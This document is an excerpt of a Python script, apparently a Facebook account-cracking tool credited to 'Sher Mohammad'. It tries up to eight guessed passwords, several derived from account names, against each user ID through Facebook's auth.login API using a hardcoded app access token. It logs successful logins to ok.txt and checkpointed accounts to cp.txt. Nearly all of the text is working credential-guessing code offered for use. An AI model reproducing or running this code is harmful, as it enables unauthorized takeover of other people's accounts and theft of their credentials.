...
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO Sher Mohammad
...
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKiPITAFI36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
...
def main():
	...
	print("\033[96;1m  [4] JOIN WHATSAPP GROUP")
...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("rm -rf Sher.py")
			os.system("cp -f Sher/Sher.py \\.")
			os.system("rm -rf Sher.py")
...
def crack_select1():
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [SHER-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [SHER-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m [SHER-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [SHER-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m [SHER-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [SHER-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m [SHER-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [SHER-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m [SHER-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [SHER-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m [SHER-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [SHER-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [SHER-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [SHER-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	pass8 = name.lower()
																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [SHER-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [SHER-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
	...
	print("\033[93;1m TOTAL \033[92;1mSHER-OK\033[93;1m/\033[91;1mSHER-CP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
